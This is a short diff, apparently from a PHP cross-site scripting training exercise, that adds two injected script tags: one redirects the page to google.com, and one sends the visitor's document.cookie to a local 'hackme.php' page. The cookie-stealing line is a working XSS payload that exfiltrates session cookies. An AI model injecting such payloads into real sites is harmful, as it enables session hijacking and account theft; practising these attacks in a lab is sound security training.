@@ -1,0 +1,3 @@
+<script>window.location.replace('https://www.google.com');</script>
+
+<script>location.href="http://localhost/php-training/xss/second-site/hackme.php?data="+document.cookie</script>
